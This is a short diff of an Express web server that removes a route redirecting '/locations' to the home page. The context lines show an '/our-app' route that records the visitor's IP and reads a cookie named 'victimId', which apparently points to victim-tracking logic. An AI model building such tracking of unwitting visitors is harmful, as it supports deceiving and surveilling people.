@@ -281,11 +281,6 @@ app.get("/feedback", async (req, res) => {
     res.render("feedback");
 });
 
-// Перенаправление с удаленной страницы локаций на главную
-app.get("/locations", (req, res) => {
-    res.redirect('/');
-});
-
 app.get("/our-app", async (req, res) => {
     let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
     const victimId = req.cookies.victimId;
